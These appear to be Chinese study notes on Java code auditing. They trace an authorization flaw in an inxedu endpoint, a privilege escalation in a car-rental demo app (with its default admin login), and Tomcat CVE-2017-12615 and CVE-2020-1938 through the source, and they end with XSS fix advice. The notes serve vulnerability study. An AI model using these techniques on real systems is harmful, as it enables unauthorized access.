<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1690989468521.png" alt="1690989468521"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">典型java业务代码结构</span><br><span class="line">Controller--&gt;service接口--&gt;serviceImpl--&gt;dao接口--&gt;daoImpl--&gt;mapper--&gt;db</span><br><span class="line">Controller:控制器层，轻业务逻辑，参数效验，异常兜底</span><br><span class="line">Service:业务层，复用性较低</span><br><span class="line">DAO：数据库访问层，主要负责&quot;操作数据库的某张表，映射到某个java对象&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">post请求 /inxedu/uc/updateUser</span><br><span class="line">搜索updateUser 		找到UserController.java类	内容结构是这样的</span><br><span class="line">...</span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/uc&quot;)</span><br><span class="line">...</span><br><span class="line">	@RequestMapping(&quot;/updateUser&quot;)</span><br><span class="line">	@ResponseBody</span><br><span class="line">	public Map&lt;String,Object&gt; updateUserInfo(HttpServletRequest request,@ModelAttribute(&quot;user&quot;) User user)&#123;</span><br><span class="line">		Map&lt;String,Object&gt; json = new HashMap&lt;String,Object&gt;();</span><br><span class="line">		try&#123;</span><br><span class="line">			userService.updateUser(user);</span><br><span class="line">			json = this.setJson(true, &quot;修改成功&quot;, user);</span><br><span class="line">			//缓存用户</span><br><span class="line">			userService.setLoginInfo(request,user.getUserId(),&quot;false&quot;);</span><br><span class="line">		&#125;catch (Exception e) &#123;</span><br><span class="line">			this.setAjaxException(json);</span><br><span class="line">			logger.error(&quot;updateUserInfo()---error&quot;,e);</span><br><span class="line">		&#125;</span><br><span class="line">		return json;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其中userService是个接口--&gt;全局搜索userServiceImpl		找到userServiceImpl.java</span><br><span class="line">...</span><br><span class="line">@Service(&quot;userService&quot;)</span><br><span class="line">...</span><br><span class="line">    public void updateUser(User user) &#123;</span><br><span class="line">    	userDao.updateUser(user);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">全局搜索userdaoimpl		找到UserDaoImpl.java</span><br><span class="line">...</span><br><span class="line">@Repository(&quot;userDao&quot;)</span><br><span class="line">...</span><br><span class="line">	public void updateUser(User user) &#123;</span><br><span class="line">		this.update(&quot;UserMapper.updateUser&quot;, user);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全局搜索Usermapper		Mybatis的映射文件UserMapper.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691573776601.png" alt="1691573776601"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里没有做身份的效验 存在越权漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring-mvc.xml		这是spring mvc的配置文件			</span><br><span class="line">applicationContext.xml	这个是spring框架的配置文件	此处连接数据库</span><br><span class="line">tomcat7:run		启动的</span><br></pre></td></tr></table></figure>

<h5 id="租车系统"><a href="#租车系统" class="headerlink" title="租车系统"></a>租车系统</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">案例二		纵向越权</span><br><span class="line">放到webapps目录下 这里需要手动创建数据库名 然后导入对应数据库</span><br><span class="line"></span><br><span class="line">http://192.168.56.1:8080/opencarrun/admin/adminLogin</span><br><span class="line">    默认账户：admin  默认密码：zft3285497</span><br><span class="line">创建用户并把创建用户的包保存起来</span><br><span class="line">用创建的用户登录 并进行创建用户 创建成功(换一下cookie)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691649632839.png" alt="1691649632839"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jsp类似php 前端看不到</span><br><span class="line">/admin/addAdmin</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691638227180.png" alt="1691638227180"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提供接口的代码在如下地址</span><br><span class="line">\Tomcat 8.5\webapps\opencarrun\WEB-INF\lib\car-weishang-1.0.jar		文件jd-gui打开</span><br><span class="line">打印的是下图这一条 其中</span><br><span class="line">	COOKIE中JSESSIONID	服务器为每一个用户设置一个session，jsessionid表示浏览器识别当前用户对应的哪个session</span><br><span class="line">	request.getRequestDispatcher	请求转发，前后页面共享一个request，服务器运行，对浏览器来说是透明的</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691649976070.png" alt="1691649976070"></p>
<h3 id="5-6-任意文件写入"><a href="#5-6-任意文件写入" class="headerlink" title="5.6 任意文件写入"></a>5.6 任意文件写入</h3><h5 id="tomcat任意文件写入-cve-2017-12615"><a href="#tomcat任意文件写入-cve-2017-12615" class="headerlink" title="tomcat任意文件写入 cve-2017-12615"></a>tomcat任意文件写入 cve-2017-12615</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/tomcat/	下载历史版本 </span><br><span class="line">	bin中windows下载exe linux下载tar.gz</span><br><span class="line">	src中是源码</span><br><span class="line">打开源码文件 java文件夹设置为source root</span><br><span class="line">setting Java compiler中选择jdk8	module添加本项目</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691934564466.png" alt="1691934564466"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">project structure</span><br><span class="line">	project选择两个8</span><br><span class="line">	modules选择8</span><br><span class="line">把它转成maven项目 如下图 发现没有maven</span><br><span class="line">8.0.53这个版本配置启动类有问题 图没改	改换8.0.45这个版本</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691934783564.png" alt="1691934783564"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手动创建pom.xml文件	然后右键pom.xml--&gt;add as maven project</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag"> 		<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="string"><span class="tag">		 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">	 <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>groupId<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>apache-tomcat-8.0.45-src<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 		&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">maven.compile.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compile.source</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">maven.compile.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compile.target</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加依赖</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.easymock<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easymock<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ant<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ant<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>wsdl4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>wsdl4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.xml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxrpc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ecj<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">configuration--&gt;application</span><br><span class="line">	启动类	org.apache.catalina.startup.Bootstrap</span><br><span class="line">	VM options		-Dcatalina.home=&quot;D:\IDEA_project\apache-tomcat-8.0.45-windows-x64\apache-tomcat-8.0.45&quot;</span><br><span class="line">		这个要选到执行文件不是src文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\IDEA_project\apache-tomcat-8.0.45-windows-x64\apache-tomcat-8.0.45\conf\web.xml中添加</span><br><span class="line">然后发包 返回201 Created</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691941136008.png" alt="1691941136008"></p>
<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691941147374.png" alt="1691941147374"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">default servlet拦截所有</span><br><span class="line">jsp servlet拦截.jsp和.jspx</span><br><span class="line">/1.jsp/走的default</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691941519565.png" alt="1691941519565"></p>
<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691941577750.png" alt="1691941577750"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找到上图DefaultServlet类的doput方法</span><br><span class="line">默认为true 初始设置改成了false	</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691942007054.png" alt="1691942007054"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这一步多了一个2.jsp给它加个断点</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691942353961.png" alt="1691942353961"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这一步多了一个3.jsp给它加个断点</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691942482825.png" alt="1691942482825"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这一步多了一个4.jsp给它加个断点</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691942601063.png" alt="1691942601063"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这一步多了一个5.jsp给它加个断点后面一样的</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691942830533.png" alt="1691942830533"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下面这一步执行完创建路径最后的斜杠会去掉		调试太复杂了没弄下去。。。。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691999550878.png" alt="1691999550878"></p>
<h5 id="tomcat文件包含cve-2020-1938"><a href="#tomcat文件包含cve-2020-1938" class="headerlink" title="tomcat文件包含cve-2020-1938"></a>tomcat文件包含cve-2020-1938</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AJP协议(定向包协议 Apache JServ Protocol)	存在一定缺陷导致参数可控	可读取包含tomcat webapp目录下任意文件</span><br><span class="line">Tomcat两大功能	web服务器(对静态资源做出回应 二是Servlet容器)</span><br><span class="line">web服务器 Apache Nginx IIS</span><br><span class="line">Servlet容器	Tomcat Weblogic JBOSS</span><br><span class="line">Tomcat处理静态资源速率远不如Apache，生成网中大多apache处理静态，tomcat处理servlet</span><br><span class="line">浏览器不能发送ajp协议包</span><br><span class="line">tomcat的	$CATALINA_BASE/conf/web.xml默认配置了两个Connector，http 8080，ajp 8009</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692002312476.png" alt="1692002312476"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ajp是二进制的tcp协议，apache和tomcat进行ajp协议通信</span><br><span class="line">	由apache通过proxy_ajp模块进行反向代理，将其转换成http服务器然后再暴露给用户，让用户进行访问</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用利用脚本	默认读取/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692064035401.png" alt="1692064035401"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark	抓包</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692064107562.png" alt="1692064107562"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此处有些疑惑 这部分相关的文章基本都是从ajprocessor前面的部分没有 找了篇tomcat启动流程的文章 看的一知半解 贴几张图 如果以后碰到需要这部分知识多的漏洞再来看看</span><br><span class="line">https://blog.csdn.net/qq_44377709/article/details/122652081</span><br><span class="line">tomcat整体架构</span><br></pre></td></tr></table></figure>

<p> <img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/0dfdc3fc04844aa0bba5819cc9aa4836.png" alt="img"> </p>
<p> <img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/942ed7969de446e984f935c96e8d3222.png" alt="img"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf/server.xml		两个connector 一个http 一个ajp</span><br><span class="line">	http给了类	org.apache.coyote.http11.Http11NioProtocol</span><br><span class="line">	可以类比ajp的类</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692064760912.png" alt="1692064760912"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里再往前追溯一点 根据上面的框图 执行顺序是protocol--&gt;processor</span><br><span class="line">org.apache.coyote.AbstractProtocol类创建processor对象	623行</span><br><span class="line">	读取socket(NioChannel)信息</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692089705251.png" alt="1692089705251"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">684行</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692089820182.png" alt="1692089820182"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳转	其中processor依次继承下图第2-5类</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692089922090.png" alt="1692089922090"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行到854行	调用prepareRequest方法</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692090136414.png" alt="1692090136414"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后循环读取	javax.servlet.include.request_uri</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692090033890.png" alt="1692090033890"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">循环的结果</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692090377402.png" alt="1692090377402"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Tomcat CATALINA_BASE/conf/web.xml配置文件默认定义两个Servlet DefaultServlet JspServlet</span><br><span class="line">用户请求uri不能与任何servlet匹配时，会默认交由defaultservlet处理</span><br><span class="line">	匹配规则上面有</span><br><span class="line">定位到DefaultServlet的doGet方法	org.apache.catalina.servlet.DefaultServlet.java</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692090981895.png" alt="1692090981895"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">调用serveResource方法 再调用getRelativePath方法 此处</span><br><span class="line">	发送包需要有request_uri	否则执行else	导致利用失败</span><br><span class="line">	传递数据不传递servlet_path	result在拼接路径时不会把/拼接在WEB-INF/web.xml的头部</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692093856515.png" alt="1692093856515"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">722行开始读物执行资源文件</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692094127445.png" alt="1692094127445"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此处调用了validate方法 	将path作为变量传递进去处理</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692094259962.png" alt="1692094259962"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="5-7-跨站脚本"><a href="#5-7-跨站脚本" class="headerlink" title="5.7 跨站脚本"></a>5.7 跨站脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Cross Site Scripting</span><br><span class="line">1.收集输入、输出点</span><br><span class="line">2.查看输入、输出点的上下文环境</span><br><span class="line">3.判断是否对输入输出做了防御工作(如过滤、扰乱以及编码)</span><br><span class="line"></span><br><span class="line">reflective-xss	dom-xss案例在xssp-demo中</span><br><span class="line">使用idea进行断点调试需要使用idea打开webapps目录</span><br><span class="line"></span><br><span class="line">常见的dom行xss输入输出点</span><br><span class="line">document.URL		eval</span><br><span class="line">document.location	document.write</span><br><span class="line">document.referer	document.InnerHTML</span><br><span class="line">document.form		document.OuterHTML</span><br><span class="line"></span><br><span class="line">修复建议</span><br><span class="line">1.与后端交互的位置执行参数的输入过滤</span><br><span class="line">	java过滤器filter Spring参数校验 </span><br><span class="line">2.与后端交互的位置执行参数的输出转义</span><br><span class="line">	可通过org.springframework.web.util.HtmlUtil和commons-lang-2.5.jar来进行HTMl标签与转义字符之间的转换来实现</span><br><span class="line">3.JS开发框架的XSS防护功能</span><br><span class="line">	AngularJS默认启动对XSS的防御</span><br><span class="line">4.标签事件属性黑白名单</span><br><span class="line">	正则匹配 事件不在白名单列表 直接拦截	(不是替换为空)</span><br><span class="line">5.HttpOnly</span><br><span class="line">	